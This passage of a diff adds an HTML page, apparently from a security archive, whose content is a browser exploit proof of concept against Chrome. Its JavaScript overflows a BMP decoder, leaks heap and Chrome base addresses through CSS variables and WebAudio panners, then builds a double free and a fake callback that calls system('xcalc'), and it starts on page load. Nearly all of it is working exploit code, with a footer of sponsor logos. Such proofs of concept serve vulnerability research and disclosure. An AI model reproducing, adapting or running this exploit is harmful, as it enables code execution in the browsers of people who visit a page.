+        div0.style.removeProperty(<span class="hljs-string">`--a<span class="hljs-subst">${i}</span>.2`</span>);
+      }
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">46</span>; i &gt; <span class="hljs-number">20</span>; i--) {
+        div0.style.removeProperty(<span class="hljs-string">`--c<span class="hljs-subst">${i}</span>.0`</span>);
+      }
+      gc(); <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>);
+
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"overflowing..."</span>);
+      fetch(<span class="hljs-string">"/bad.bmp"</span>).then(<span class="hljs-keyword">async</span> response =&gt; {
+        <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+        <span class="hljs-keyword">let</span> imageDecoder = <span class="hljs-keyword">new</span> ImageDecoder({
+          <span class="hljs-attr">data</span>: response.body,
+          <span class="hljs-attr">type</span>: <span class="hljs-string">"image/bmp"</span>
+        });
+        increase_refs(<span class="hljs-number">0xff02</span>); <span class="hljs-comment">// overflow will overwrite 0xff02 to 0xff00</span>
+
+        imageDecoder.decode().then(<span class="hljs-keyword">async</span> () =&gt; {
+          gc(); gc();
+          <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2500</span>);
+          <span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+          <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);
+
+          <span class="hljs-comment">// fake CSSVariableData</span>
+          view[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// ref_count</span>
+          <span class="hljs-keyword">const</span> newCSSVarLen = <span class="hljs-number">0x19000</span>;
+          <span class="hljs-comment">// kMaxVariableBytes</span>
+          <span class="hljs-comment">// console.assert(newCSSVarLen &lt;= 2097152, 'CSSLen too long');</span>
+          <span class="hljs-comment">// length and flags, set is_8bit_</span>
+          view[<span class="hljs-number">1</span>] = newCSSVarLen | <span class="hljs-number">0x01000000</span>;
+          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">2</span>; i &lt; view.length; i++)
+            view[i] = i;
+          <span class="hljs-keyword">await</span> allocAudioArray(<span class="hljs-number">0x2000</span>, ab, <span class="hljs-number">1</span>);
+          leak();
+        })
+      });
+    }
+
+    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"></span>) </span>{
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"continuing..."</span>);
+      <span class="hljs-keyword">let</span> div0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div0'</span>);
+      <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+      <span class="hljs-keyword">let</span> CSSLeak = rs.getPropertyValue(kTargetCSSVar)
+        .substring(<span class="hljs-number">0x15000</span> - <span class="hljs-number">8</span>);
+      <span class="hljs-built_in">console</span>.log(CSSLeak.length.toString(<span class="hljs-number">16</span>));
+      <span class="hljs-keyword">let</span> memoryPattern = <span class="hljs-regexp">/\x02\x00\x00\x00\x14\x04\x00\x01(\d+\.\d+)/g</span>;
+      CSSVars = [...CSSLeak.matchAll(memoryPattern)];
+      <span class="hljs-built_in">console</span>.log(CSSVars);
+      <span class="hljs-keyword">if</span> (CSSVars.length &lt; kSprayPannerCount) {
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"WARN: insufficient CSSVars found, found vs min:"</span>,
+          CSSVars.length, <span class="hljs-string">"vs"</span>, kSprayPannerCount);
+        <span class="hljs-keyword">return</span>;
+      }
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"corrupted with success"</span>);
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kSprayPannerCount; i++) {
+        panners.push(audioCtx.createPanner());
+      }
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kSprayPannerCount; i++) {
+        <span class="hljs-comment">// console.log(`removing --b${CSSVars[i][1]}`);</span>
+        <span class="hljs-comment">// i really idk why, but i need add the ref_count_ and remove the</span>
+        <span class="hljs-comment">// prop to trigger free</span>
+        rs.getPropertyValue(<span class="hljs-string">`--b<span class="hljs-subst">${CSSVars[i][<span class="hljs-number">1</span>]}</span>`</span>);
+        div0.style.removeProperty(<span class="hljs-string">`--b<span class="hljs-subst">${CSSVars[i][<span class="hljs-number">1</span>]}</span>`</span>);
+      }
+      gc(); gc(); <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; panners.length; i++) {
+        panners[i].panningModel = <span class="hljs-string">'HRTF'</span>;
+      }
+
+      <span class="hljs-comment">// free two panners after target CSSVariableData</span>
+      panners[kSprayPannerCount - <span class="hljs-number">2</span>].panningModel = <span class="hljs-string">'equalpower'</span>;
+      panners[kSprayPannerCount - <span class="hljs-number">1</span>].panningModel = <span class="hljs-string">'equalpower'</span>;
+      <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+      <span class="hljs-keyword">let</span> hrtfLeak = rs.getPropertyValue(kTargetCSSVar)
+        .substring(<span class="hljs-number">0x15000</span> - <span class="hljs-number">8</span>);
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; CSSVars.length; i++) {
+        <span class="hljs-keyword">let</span> leak = hrtfLeak.substring(CSSVars[i].index, CSSVars[i].index + <span class="hljs-number">8</span>);
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"0x"</span> + u64(leak).toString(<span class="hljs-number">16</span>),
+          <span class="hljs-string">"0x"</span> + CSSVars[i].index.toString(<span class="hljs-number">16</span>));
+      }
+      heapAddr = (u64(hrtfLeak.substring(CSSVars[<span class="hljs-number">8</span>].index + <span class="hljs-number">8</span>,
+        CSSVars[<span class="hljs-number">8</span>].index + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xfffffffffff00000</span>n) + <span class="hljs-number">0xc000</span>n;
+      fakePannerAddr = heapAddr - <span class="hljs-number">0x959000</span>n + BigInt(CSSVars[<span class="hljs-number">8</span>].index);
+      chromeBase = u64(hrtfLeak.substring(CSSVars[<span class="hljs-number">8</span>].index,
+        CSSVars[<span class="hljs-number">8</span>].index + <span class="hljs-number">8</span>));
+      chromeBase -= kHRTFPannerVtableOffset;
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"heap leak: 0x"</span> + heapAddr.toString(<span class="hljs-number">16</span>),
+        CSSVars[<span class="hljs-number">1</span>].index.toString(<span class="hljs-number">16</span>));
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"chrome leak: 0x"</span> + chromeBase.toString(<span class="hljs-number">16</span>),
+        CSSVars[<span class="hljs-number">8</span>].index.toString(<span class="hljs-number">16</span>));
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"fakePannerAddr: 0x"</span> + fakePannerAddr.toString(<span class="hljs-number">16</span>));
+      <span class="hljs-comment">// search '13.1CCCCC' anon:partition_alloc ; x/gx addr+0x2000-8</span>
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"CSSVarData UAF: 0x"</span> + (heapAddr - <span class="hljs-number">0x982000</span>n)
+        .toString(<span class="hljs-number">16</span>));
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"hrtfLeak.length: 0x"</span> + hrtfLeak.length.toString(<span class="hljs-number">16</span>));
+      gc();
+      setTimeout(doubleFree, <span class="hljs-number">1000</span>);
+    }
+
+    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doubleFree</span>(<span class="hljs-params"></span>) </span>{
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"start free(CSSVariableData)"</span>)
+      <span class="hljs-keyword">let</span> div0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div0'</span>);
+      <span class="hljs-keyword">let</span> div1 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'div1'</span>);
+      <span class="hljs-keyword">let</span> audioCtxDelay = audioCtxArr.pop();
+      <span class="hljs-keyword">let</span> delayNode = delayNodeArr.pop();
+      <span class="hljs-keyword">let</span> srcNode = srcNodeArr.pop();
+
+      <span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+      <span class="hljs-keyword">let</span> abFakeObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x600</span>);
+      <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> BigUint64Array(ab);
+      <span class="hljs-keyword">let</span> viewFakeObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(abFakeObj);
+      view[<span class="hljs-number">0</span>] = swapEndian(fakePannerAddr - <span class="hljs-number">0x10</span>n);
+
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; viewFakeObj.byteLength; i++)
+        viewFakeObj.setUint8(i, <span class="hljs-number">0x4a</span>); <span class="hljs-comment">// "J"</span>
+
+      <span class="hljs-keyword">const</span> system_addr = chromeBase + kSystemLibcOffset;
+      <span class="hljs-comment">// call   qword ptr [rax + 8]</span>
+      viewFakeObj.setBigUint64(<span class="hljs-number">0x0</span>, fakePannerAddr + <span class="hljs-number">8</span>n - <span class="hljs-number">8</span>n, <span class="hljs-literal">true</span>);
+      <span class="hljs-comment">// viewFakeObj.setBigUint64(8, 0xdeadbeefn, true);</span>
+      viewFakeObj.setBigUint64(<span class="hljs-number">0x8</span>, chromeBase + kWriteListenerOffset,
+        <span class="hljs-literal">true</span>);
+      <span class="hljs-comment">// fake BindState addr</span>
+      viewFakeObj.setBigUint64(<span class="hljs-number">0x10</span>, fakePannerAddr + <span class="hljs-number">0x18</span>n, <span class="hljs-literal">true</span>);
+
+      <span class="hljs-comment">// start of fake BindState</span>
+      <span class="hljs-comment">// 0x636c616378 == xcalc</span>
+      viewFakeObj.setBigUint64(<span class="hljs-number">0x18</span> + <span class="hljs-number">0</span>,
+        <span class="hljs-number">0x636c616378</span>n <span class="hljs-comment">/* -1 because ref_count_ + 1 */</span> - <span class="hljs-number">1</span>n, <span class="hljs-literal">true</span>);
+      viewFakeObj.setBigUint64(<span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span>, system_addr, <span class="hljs-literal">true</span>);
+
+      <span class="hljs-keyword">let</span> rs = getComputedStyle(div0);
+      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
+        div1.style.setProperty(<span class="hljs-string">`--sprayD<span class="hljs-subst">${i}</span>`</span>, kCSSStringCross0x2000);
+      }
+      rs.getPropertyValue(kTargetCSSVar);
+      div0.style.removeProperty(kTargetCSSVar);
+      gc(); gc();
+      <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"start free(AudioBuffer)"</span>);
+
+      <span class="hljs-comment">// ((0.466796875 * 4096 * 1024) / 1024 + 0x80) * 4 + 0x20 == 0x2000</span>
+      <span class="hljs-keyword">let</span> delayToAlloc0x2000 = <span class="hljs-number">0.466796875</span>;
+      audioCtxDelay.oncomplete = <span class="hljs-keyword">async</span> () =&gt; {
+        <span class="hljs-comment">// now freelist is circular A =&gt; A</span>
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"delay nodes deleted, freelist should be circular"</span>);
+        gc(); gc(); gc(); gc();
+        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">3000</span>);
+
+
+        <span class="hljs-comment">// overwrite freelist pointer to fakePannerAddr</span>
+        <span class="hljs-comment">// allocAudioArray copy/paste function because on call the same</span>
+        <span class="hljs-comment">// func 3 times will start compilation and change heap layout</span>
+        <span class="hljs-keyword">let</span> audioCtxDelay = <span class="hljs-keyword">new</span> OfflineAudioContext(<span class="hljs-number">1</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>);
+        <span class="hljs-keyword">let</span> delayNode = audioCtxDelay.createDelay(delayToAlloc0x2000);
+        <span class="hljs-keyword">let</span> buffer = audioCtx.createBuffer(<span class="hljs-number">1</span>, <span class="hljs-number">0x600</span>, <span class="hljs-number">4096</span>);
+        <span class="hljs-keyword">let</span> dstData = buffer.getChannelData(<span class="hljs-number">0</span>);
+        <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(dstData.buffer).set(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(ab));
+        <span class="hljs-keyword">let</span> srcNode = audioCtxDelay.createBufferSource();
+        srcNode.buffer = buffer;
+        srcNode.connect(delayNode).connect(audioCtxDelay.destination);
+        audioCtxDelay.suspend(<span class="hljs-number">0x600</span> / <span class="hljs-number">4096.0</span>);
+        srcNode.start();
+        audioCtxDelay.startRendering();
+        <span class="hljs-comment">// copy/paste</span>
+        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>);
+
+        <span class="hljs-comment">// consume freelist entry</span>
+        div1.style.setProperty(<span class="hljs-string">'--tick'</span>, kCSSStringCross0x2000);
+
+        <span class="hljs-comment">// allocAudioArray copy/paste function because on call the same</span>
+        <span class="hljs-comment">// func 3 times will start compilation and change heap layout</span>
+        <span class="hljs-keyword">let</span> audioCtxDelay3 = <span class="hljs-keyword">new</span> OfflineAudioContext(<span class="hljs-number">1</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>);
+        <span class="hljs-keyword">let</span> delayNode3 = audioCtxDelay3.createDelay(delayToAlloc0x2000);
+        <span class="hljs-keyword">let</span> buffer3 = audioCtx.createBuffer(<span class="hljs-number">1</span>, <span class="hljs-number">0x600</span>, <span class="hljs-number">4096</span>);
+        <span class="hljs-keyword">let</span> dstData3 = buffer3.getChannelData(<span class="hljs-number">0</span>);
+        <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(dstData3.buffer).set(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(abFakeObj));
+        <span class="hljs-keyword">let</span> srcNode3 = audioCtxDelay3.createBufferSource();
+        srcNode3.buffer = buffer3;
+        srcNode3.connect(delayNode3).connect(audioCtxDelay3.destination);
+        audioCtxDelay3.suspend(<span class="hljs-number">0x600</span> / <span class="hljs-number">4096.0</span>);
+        srcNode3.start();
+        audioCtxDelay3.startRendering();
+        <span class="hljs-comment">// copy/paste</span>
+
+        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = panners.length - <span class="hljs-number">3</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
+          panners[i].panningModel = <span class="hljs-string">'equalpower'</span>;
+        }
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"destructors called"</span>)
+      };
+      audioCtxDelay.resume();
+    }
+  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"pwn();"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"div0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"div1"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p><strong>END</strong></p>
+
+
+<hr/>
+<p>The site is operated with support of the following sponsors:</p>
+
+<img alt="linuxfoundation" src="../images/thelinuxfoundation.png"/ class="sponsor">
+<img alt="red-hatcomunity" src="../images/redhat-community.png" class="sponsor"/>
+<img alt="constellix-green-logo" src="../images/constellix-green-logo.png" cloass="sponsor"/>
+<img alt="gromacs" src="../images/gromacs.webp" width="140px" class="sponsor"/>
+<img alt="namd" src="../images/namd.jpeg" width="140px" class="sponsor"/>
+
+<hr/>
+<center>2005-2024 &copy;</center>
+</body>
+
+</html>
